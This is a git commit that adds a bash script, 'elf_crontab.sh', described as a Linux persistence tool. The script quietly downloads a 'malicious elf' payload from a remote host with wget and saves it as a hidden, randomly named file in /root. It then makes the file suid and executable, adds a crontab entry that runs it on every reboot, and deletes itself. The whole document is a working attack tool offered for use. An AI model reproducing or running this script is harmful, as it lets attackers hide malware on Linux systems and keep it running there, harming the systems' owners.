6be072f25b40eeecc183c5254f30b1687641fcdf
calfcrusher <calfcrusher@inventati.org>
2021-08-13 02:36:09 +0200

    Create elf_crontab.sh

---
+++ elf_crontab.sh
@@ -0,0 +1,34 @@
+#!/bin/bash
+#
+# calfcrusher@inventati.org
+#
+#
+# A simple persistence script for Linux
+#
+# Download elf payload and set cron persistence on reboot, then remove itself
+#
+
+# Url with payload to download
+URL="https://192.168.1.7:8080/payload.elf"
+
+# Randomize payload name
+PAYLOAD=$RANDOM
+
+# Add dot to make hidden file
+PAYLOAD=".${PAYLOAD}"
+
+# Download malicious elf
+wget -q --no-check-certificate "${URL}" -O /root/$PAYLOAD
+
+# Make suid executable :)
+chmod u+s /root/$PAYLOAD
+chmod +x /root/$PAYLOAD
+
+# Persistence in crontab
+crontab -l > temp_cron > /dev/null 2>&1
+echo "@reboot sleep 30; /root/$PAYLOAD 2>&1" >> temp_cron
+crontab temp_cron
+rm temp_cron
+
+# Remove itself
+rm -- "$0"
